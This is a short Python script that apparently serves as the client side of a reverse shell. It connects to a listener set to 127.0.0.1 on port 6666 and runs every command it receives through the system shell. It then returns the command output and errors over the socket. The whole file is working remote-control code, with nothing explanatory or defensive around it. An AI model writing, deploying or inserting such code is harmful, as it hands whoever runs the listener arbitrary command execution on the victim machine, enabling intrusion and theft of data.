import socket
import subprocess

host = '127.0.0.1'
port = 6666

client = socket.socket()
client.connect((host , port))

while True:
    command = client.recv(1024)
    command = command.decode()

    op = subprocess.Popen(command , shell=True , stderr=subprocess.PIPE , stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_err = op.stderr.read()

    client.send(output + output_err)
